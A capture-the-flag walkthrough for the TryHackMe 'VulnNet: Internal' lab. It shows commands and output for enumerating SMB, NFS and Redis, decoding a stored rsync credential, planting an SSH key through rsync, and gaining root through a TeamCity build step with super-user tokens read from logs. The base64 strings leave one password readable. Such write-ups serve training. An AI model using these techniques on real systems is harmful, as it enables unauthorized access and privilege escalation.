# [VulnNet: Internal](https://tryhackme.com/room/vulnnetinternal)

First as always, `nmap`

```
# Nmap 7.91 scan initiated Sun Jul 25 08:23:59 2021 as: nmap -vvv -p 111,139,445,873,2049,6379,22,36615,37105,33557,50995,57405 -Pn -sCV -oN nmap 10.10.158.53
Nmap scan report for box.ip (10.10.158.53)
Host is up, received user-set (0.23s latency).
Scanned at 2021-07-25 08:23:59 UTC for 43s

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       syn-ack (protocol version 31)
2049/tcp  open  nfs         syn-ack 3-4 (RPC #100003)
6379/tcp  open  redis       syn-ack Redis key-value store
33557/tcp open  mountd      syn-ack 1-3 (RPC #100005)
36615/tcp open  rpcbind     syn-ack
37105/tcp open  unknown     syn-ack
50995/tcp open  mountd      syn-ack 1-3 (RPC #100005)
57405/tcp open  mountd      syn-ack 1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -41m07s, deviation: 1h09m15s, median: -1m08s
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 16682/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29421/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41896/udp): CLEAN (Timeout)
|   Check 4 (port 35485/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-07-25T10:23:19+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-25T08:23:19
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 25 08:24:42 2021 -- 1 IP address (1 host up) scanned in 43.12 seconds
```

Service of interest here are SSH, SMB, rsync, NFS, and redis.

## SMB

```sh
$ smbclient -L //box.ip/ -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Here we have a single share named "shares" so we check it out.

```
$ smbclient //box.ip/shares/ -N

smb: \> ls
  .                                   D        0  Tue Feb  2 09:20:09 2021
  ..                                  D        0  Tue Feb  2 09:28:11 2021
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275820 blocks available

smb: \>  cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 11:45:10 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  services.txt                        N       38  Sat Feb  6 11:45:09 2021

		11309648 blocks of size 1024. 3275820 blocks available
smb: \temp\> more services.txt
THM{REDACTED}
```

With this, we have our services flag.

## NFS

To start, we list the shares available for mounting.

```sh
$ showmount -e box.ip
Export list for box.ip:
/opt/conf *
```

We can then mount the listed share

```sh
$ sudo mount -t nfs box.ip:/opt/conf ./mnt
```
 Enumerating the mounted share, we have the file `/redix/redix.conf`, inside which is a password

```sh
$ cat redis.conf | grep pass

requirepass "REDACTED"
```

## Redis

Using the found password, we can log into redis with `redis-cli`

```
$ redis-cli -h box.ip -a "REDACTED"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
box.ip:6379> keys *
1) "authlist"
2) "tmp"
3) "int"
4) "marketlist"
5) "internal flag"

box.ip:6379> get "internal flag"
"THM{****}"

box.ip:6379> lrange authlist 1 10
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

Besides the internal flag, we have a base64-encoded string it `authlist` which when decoded gives us credentials for rsync.

```sh
$ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password ****
```

## rsync

We can list all the files available from rsync.

```sh
$ rsync -av --list-only rsync://rsync-connect@box.ip/
files          	Necessary home interaction

$ rsync -av --list-only rsync://rsync-connect@box.ip/files
[snip]
drwxrwxr-x          4,096 2021/02/06 11:43:14 sys-internal/.ssh
```

Since we have what looks like a home directory with `.ssh`, we can upload our own SSH to the machine and SSH in.

```sh
$ ssh-keygen
$ chmod 600 test
$ mv test.pub authorized_keys
$ rsync -av authorized_keys rsync://rsync-connect@box.ip/files/sys-internal/.ssh
$ ssh -i test sys-internal@box.ip
```

## Privilege Escalation

Looking at `/`, we see the out-of-place directory "TeamCity".

```sh
sys-internal@vulnnet-internal:~$ ls /
bin   etc         initrd.img.old  lost+found  opt   run   swapfile  tmp  vmlinuz
boot  home        lib             media       proc  sbin  sys       usr  vmlinuz.old
dev   initrd.img  lib64           mnt         root  srv   TeamCity  var
```

According to the file `TeamCity-readme.txt`, this service should be running on port 8111, so let's port-forward our machine to it.

```sh
ssh -i test -NT -L 8111:127.0.0.1:8111 sys-internal@box.ip
```

Upon navigating to `localhost:8111`, we're greeted with a login page. Since we have a shell on the machine, let's look for credentials before we do any brute-forcing.

We can find some access tokens in the logs

```sh
sys-internal@vulnnet-internal:/TeamCity/logs$ grep -F '[TeamCity]' catalina.out
[TeamCity] Super user authentication token: 844662****** (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 844662****** (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 378256****** (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 581262****** (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 193564****** (use empty username with the token as the password to access the server)
```

Using one of the found tokens, we're able to log in to TeamCity which is runnning as root (super user). To get a shell, we do the following:

1. Create project
1. Go to Build Configurations
1. Go to Build steps and Add build step to run a command of your choice
1. Save and run

If your command of choice was a reverse shell, you should now have a root shell.
